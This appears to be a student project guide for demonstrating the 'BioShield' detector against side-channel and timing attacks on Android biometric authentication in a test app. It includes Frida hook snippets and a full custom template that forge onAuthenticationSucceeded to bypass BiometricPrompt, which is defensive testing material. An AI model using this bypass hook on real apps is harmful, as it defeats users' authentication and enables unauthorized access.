# Side-Channel Attack Demonstration Guide

## Overview

This guide shows how to use the **biometric_test_app** to demonstrate and detect **5 types of side-channel attacks** using BioShield's Frida-based detection system.

---

## Prerequisites

1. **Biometric Test App** installed on emulator/device
2. **BioShield** installed and logged in
3. **Frida server** running on device
4. **Attack scripts** in `REPACK/frida/side_channel_attacks/`

---

## Attack Scenarios

### Scenario 1: Timing Attack (Instant Bypass)

**What it demonstrates:** Authentication bypassed in < 100ms

**Attack Script:** [`timing_attack.js`](../REPACK/frida/side_channel_attacks/timing_attack.js)

**How it works:**
```javascript
// Hooks BiometricPrompt and triggers success immediately
BiometricPrompt.authenticate.implementation = function(info) {
    this.authenticate(info);

    setTimeout(() => {
        callback.onAuthenticationSucceeded(fakeResult);
    }, 5); // Only 5ms delay!
};
```

**Expected Detection:**
```
✅ TIMING_ATTACK: Authentication completed in 5-20ms (< 100ms minimum)
✅ CONSTANT_TIME_LEAK: Timing variance = 0.05ms (expected > 50ms)
✅ LOW_TIMING_ENTROPY: Entropy = 0.0 (expected > 1.0)
📊 SIDE_CHANNEL_SCORE: 70-85/100 (HIGH to CRITICAL)
```

---

### Scenario 2: Replay Attack (Constant Timing)

**What it demonstrates:** Prerecorded timing patterns replayed

**Attack Script:** [`replay_attack.js`](../REPACK/frida/side_channel_attacks/replay_attack.js)

**How it works:**
```javascript
const REPLAY_TIMINGS = [500, 500, 500, 500]; // Constant pattern

BiometricPrompt.authenticate.implementation = function(info) {
    const delay = REPLAY_TIMINGS[index++ % REPLAY_TIMINGS.length];
    setTimeout(() => {
        callback.onAuthenticationSucceeded(fakeResult);
    }, delay);
};
```

**Expected Detection:**
```
✅ REPLAY_PATTERN: Detected repeating timing intervals
✅ CONSTANT_TIME_LEAK: Timing variance = 0ms
✅ LOW_TIMING_ENTROPY: Entropy = 0.0
📊 SIDE_CHANNEL_SCORE: 60-75/100 (HIGH)
```

---

### Scenario 3: Timing Correlation Attack

**What it demonstrates:** Different timing for success vs failure (information leak)

**Attack Script:** [`timing_correlation_attack.js`](../REPACK/frida/side_channel_attacks/timing_correlation_attack.js)

**How it works:**
```javascript
const delay = isSuccess ? 2000 : 800; // Success takes longer!

// This leaks information:
// - 800ms = failed attempt
// - 2000ms = successful attempt
// Attacker can distinguish them!
```

**Expected Detection:**
```
✅ TIMING_CORRELATION: Success avg: 2000ms, Failure avg: 800ms (diff: 1200ms)
📊 SIDE_CHANNEL_SCORE: 30-60/100 (MEDIUM to HIGH)
```

---

### Scenario 4: High Variance Timing Exploit

**What it demonstrates:** Probing attack with extreme timing variations

**Attack Script:** [`variance_exploit_attack.js`](../REPACK/frida/side_channel_attacks/variance_exploit_attack.js)

**How it works:**
```javascript
const PROBE_TIMINGS = [50, 5000, 100, 4800, 75, 5200, 90, 4900];

// Attacker probes system with varied timings to:
// - Find timing vulnerabilities
// - Map authentication behavior
// - Bypass rate limiting
```

**Expected Detection:**
```
✅ TIMING_CHANNEL_EXPLOIT: Extremely high variance = 5123ms (possible probing attack)
📊 SIDE_CHANNEL_SCORE: 20-40/100 (MEDIUM)
```

---

### Scenario 5: Normal Behavior (Baseline)

**What it demonstrates:** Legitimate biometric authentication (no attack)

**Attack Script:** None - use legitimate app with Frida Gadget v3

**How it works:**
```
User triggers any test scenario in biometric_test_app
Real fingerprint scan with natural timing variations
```

**Expected Detection:**
```
✅ No vulnerabilities detected
✅ timing_variance: 50-500ms (natural)
✅ timing_entropy: 1.5-2.5 (human behavior)
📊 SIDE_CHANNEL_SCORE: 0-20/100 (LOW - normal)
```

---

## Step-by-Step Testing Procedure

### Setup Phase

1. **Install Biometric Test App**
```bash
cd c:\Users\User\Desktop\School\FYP\biometric_test_app
adb install build/app/outputs/flutter-apk/app-debug.apk
```

2. **Start App**
```bash
adb shell am start -n com.example.biometric_test_app/.MainActivity
```

3. **Verify Frida Server Running**
```bash
adb shell "ps | grep frida"
# Should show: frida-server process
```

---

### Test 1: Baseline (Normal Behavior)

**Purpose:** Establish baseline for legitimate authentication

```bash
# 1. DON'T attach Frida (use normal Gadget)
adb shell am start -n com.example.biometric_test_app/.MainActivity

# 2. In the app, click "Test 1: Perfect Implementation"

# 3. Scan your fingerprint normally

# 4. In BioShield, go to Scan Screen → "Process Logs"
```

**Expected Result:**
```json
{
  "side_channel_analysis": {
    "has_timing_attack": false,
    "has_constant_time_leak": false,
    "timing_variance": 125.5,
    "timing_entropy": 1.85,
    "suspicious_patterns": 0,
    "side_channel_score": 0.0,
    "vulnerabilities": []
  }
}
```

---

### Test 2: Timing Attack

**Purpose:** Demonstrate instant bypass detection

```bash
# 1. Clear old logs
adb shell rm /storage/emulated/0/Download/BioShield/logs.jsonl

# 2. Navigate to attack scripts
cd c:\Users\User\Desktop\School\FYP\BioShield\REPACK\frida\side_channel_attacks

# 3. Run timing attack
run_timing_attack.bat

# OR manually:
"C:/Users/User/AppData/Roaming/Python/Python313/Scripts/frida.exe" -U -f com.example.biometric_test_app -l timing_attack.js --no-pause

# 4. In the app, click ANY test button (attack hooks all)

# 5. Watch adb logcat for Frida messages
adb logcat | findstr "ATTACK"

# 6. In BioShield, go to Scan Screen → "Process Logs"
```

**Expected Logcat Output:**
```
[ATTACK] Intercepted authenticate() - bypassing instantly!
[ATTACK] Triggering instant success!
```

**Expected BioShield Detection:**
```json
{
  "side_channel_analysis": {
    "has_timing_attack": true,
    "has_constant_time_leak": true,
    "timing_variance": 3.2,
    "timing_entropy": 0.3,
    "suspicious_patterns": 2,
    "side_channel_score": 70.0,
    "vulnerabilities": [
      "TIMING_ATTACK: Authentication completed in 12ms (< 100ms minimum)",
      "CONSTANT_TIME_LEAK: Timing variance = 3.20ms (expected > 50ms)",
      "LOW_TIMING_ENTROPY: Entropy = 0.300 (expected > 1.0)"
    ]
  }
}
```

---

### Test 3: Replay Attack

**Purpose:** Demonstrate replay pattern detection

```bash
# 1. Clear old logs
adb shell rm /storage/emulated/0/Download/BioShield/logs.jsonl

# 2. Run replay attack
cd c:\Users\User\Desktop\School\FYP\BioShield\REPACK\frida\side_channel_attacks
run_replay_attack.bat

# 3. In the app, click multiple test buttons (trigger 4-5 times)

# 4. Watch for constant 500ms timing in logcat
adb logcat | findstr "replay"

# 5. Process logs in BioShield
```

**Expected Logcat Output:**
```
[ATTACK] Using replay timing: 500ms (pattern index: 0)
[ATTACK] Triggering replayed success at 500ms
[ATTACK] Using replay timing: 500ms (pattern index: 1)
[ATTACK] Triggering replayed success at 500ms
[ATTACK] Using replay timing: 500ms (pattern index: 2)
[ATTACK] Triggering replayed success at 500ms
```

**Expected Detection:**
```json
{
  "side_channel_analysis": {
    "has_timing_attack": false,
    "has_constant_time_leak": true,
    "timing_variance": 0.0,
    "timing_entropy": 0.0,
    "suspicious_patterns": 2,
    "side_channel_score": 60.0,
    "vulnerabilities": [
      "REPLAY_PATTERN: Detected repeating timing intervals (possible replay attack)",
      "CONSTANT_TIME_LEAK: Timing variance = 0.00ms (expected > 50ms)",
      "LOW_TIMING_ENTROPY: Entropy = 0.000 (expected > 1.0)"
    ]
  }
}
```

---

### Test 4: Timing Correlation Attack

**Purpose:** Demonstrate success/failure timing leak detection

```bash
# 1. Clear old logs
adb shell rm /storage/emulated/0/Download/BioShield/logs.jsonl

# 2. Run correlation attack
cd c:\Users\User\Desktop\School\FYP\BioShield\REPACK\frida\side_channel_attacks
run_correlation_attack.bat

# 3. Trigger authentication multiple times (5-10 times)
#    The script alternates between success (2000ms) and failure (800ms)

# 4. Process logs in BioShield
```

**Expected Logcat Output:**
```
[ATTACK] Attempt #1 - Will FAIL
[ATTACK] Using timing: 800ms for failure
[ATTACK] Attempt #2 - Will FAIL
[ATTACK] Using timing: 800ms for failure
[ATTACK] Attempt #3 - Will FAIL
[ATTACK] Using timing: 800ms for failure
[ATTACK] Attempt #4 - Will SUCCEED
[ATTACK] Using timing: 2000ms for success
```

**Expected Detection:**
```json
{
  "side_channel_analysis": {
    "timing_variance": 360000.0,
    "suspicious_patterns": 1,
    "side_channel_score": 30.0,
    "vulnerabilities": [
      "TIMING_CORRELATION: Success avg: 2000ms, Failure avg: 800ms (diff: 1200ms)"
    ]
  }
}
```

---

### Test 5: Variance Exploit Attack

**Purpose:** Demonstrate high variance probing detection

```bash
# 1. Clear old logs
adb shell rm /storage/emulated/0/Download/BioShield/logs.jsonl

# 2. Run variance exploit
cd c:\Users\User\Desktop\School\FYP\BioShield\REPACK\frida\side_channel_attacks
"C:/Users/User/AppData/Roaming/Python/Python313/Scripts/frida.exe" -U -f com.example.biometric_test_app -l variance_exploit_attack.js --no-pause

# 3. Trigger authentication multiple times (6-8 times)

# 4. Process logs in BioShield
```

**Expected Detection:**
```json
{
  "side_channel_analysis": {
    "timing_variance": 5123.45,
    "suspicious_patterns": 1,
    "side_channel_score": 20.0,
    "vulnerabilities": [
      "TIMING_CHANNEL_EXPLOIT: Extremely high variance = 5123.45ms (possible probing attack)"
    ]
  }
}
```

---

## Viewing Results in BioShield

### Method 1: Scan Screen

1. Open BioShield app
2. Navigate to **Scan Screen**
3. Click **"Process Logs"**
4. View results showing:
   - Total events
   - Success/failure counts
   - **Side-channel analysis**
   - Risk score

### Method 2: Firebase Console

1. Go to Firebase Console → Firestore Database
2. Navigate to `users/{your_uid}/scans/`
3. Click on the latest scan document
4. View `side_channel_analysis` object:

```json
{
  "side_channel_analysis": {
    "has_timing_attack": true,
    "has_constant_time_leak": true,
    "timing_variance": 3.2,
    "timing_entropy": 0.3,
    "suspicious_patterns": 3,
    "side_channel_score": 85.0,
    "vulnerabilities": [
      "TIMING_ATTACK: Authentication completed in 45ms",
      "CONSTANT_TIME_LEAK: Timing variance = 3.20ms",
      "REPLAY_PATTERN: Detected repeating timing intervals",
      "LOW_TIMING_ENTROPY: Entropy = 0.300"
    ],
    "total_duration_ms": 45
  }
}
```

### Method 3: Scan Details Screen

1. After processing logs, view scan details
2. Scroll to **"Side-Channel Analysis"** section
3. See:
   - Side-channel score gauge
   - List of detected vulnerabilities
   - Recommended mitigations

---

## Comparison Table

| Attack Type | Duration | Variance | Entropy | Patterns | Score | Detection |
|-------------|----------|----------|---------|----------|-------|-----------|
| **Normal** | 1000-3000ms | 50-500ms | 1.5-2.5 | 0 | 0-20 | ✅ Clean |
| **Timing Attack** | 5-20ms | < 10ms | 0.0-0.3 | 1-2 | 70-85 | ⚠️ CRITICAL |
| **Replay Attack** | 500ms | 0ms | 0.0 | 2 | 60-75 | ⚠️ HIGH |
| **Correlation** | 800-2000ms | High | 1.0-2.0 | 1 | 30-60 | ⚠️ MEDIUM |
| **Variance Exploit** | 50-5200ms | > 5000ms | 1.5-2.0 | 1 | 20-40 | ⚠️ MEDIUM |

---

## Troubleshooting

### Issue: "No logs found"

**Solution:**
```bash
# Check if log file exists
adb shell ls -la /storage/emulated/0/Download/BioShield/

# Check file permissions
adb shell cat /storage/emulated/0/Download/BioShield/logs.jsonl

# Manually trigger auth if needed
adb shell am start -n com.example.biometric_test_app/.MainActivity
```

---

### Issue: Frida script not hooking

**Solution:**
```bash
# Check Frida is attached
"C:/Users/User/AppData/Roaming/Python/Python313/Scripts/frida-ps.exe" -U

# Check logcat for Frida messages
adb logcat | findstr "FRIDA"

# Try manual attach instead of spawn
"C:/Users/User/AppData/Roaming/Python/Python313/Scripts/frida.exe" -U com.example.biometric_test_app -l timing_attack.js
```

---

### Issue: App crashes during attack

**Solution:**
```bash
# Check logcat for crash reason
adb logcat | findstr "FATAL"

# Try simpler attack first (timing_attack.js)

# Ensure app has biometric permission
adb shell pm grant com.example.biometric_test_app android.permission.USE_BIOMETRIC
```

---

## Advanced: Creating Custom Attacks

### Custom Attack Template

```javascript
// custom_attack.js
console.log("=== [CUSTOM ATTACK] Loaded ===");

Java.perform(() => {
    const BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt");

    BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function(info) {
        console.log("[ATTACK] Custom attack triggered");

        const result = this.authenticate(info);

        // YOUR ATTACK LOGIC HERE
        const customDelay = 1234; // Your timing

        setTimeout(() => {
            try {
                const callbackField = this.class.getDeclaredField("mAuthenticationCallback");
                callbackField.setAccessible(true);
                const callback = callbackField.get(this);

                if (callback) {
                    // Trigger success or failure
                    const AuthResult = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");
                    const fakeResult = AuthResult.$new(null, 2);
                    callback.onAuthenticationSucceeded(fakeResult);
                }
            } catch (e) {
                console.log("[ERROR] " + e);
            }
        }, customDelay);

        return result;
    };
});
```

---

## Summary

You now have **4 attack scripts** demonstrating:

✅ **Timing Attack** - Instant bypass (< 100ms)
✅ **Replay Attack** - Constant timing patterns
✅ **Correlation Attack** - Success/failure timing leak
✅ **Variance Exploit** - High variance probing

All attacks are **automatically detected** by BioShield's side-channel analysis and uploaded to Firebase with:
- Specific vulnerability descriptions
- Side-channel risk score (0-100)
- Actionable mitigation recommendations

Perfect for **demonstrations, research papers, and FYP presentations**! 🎓
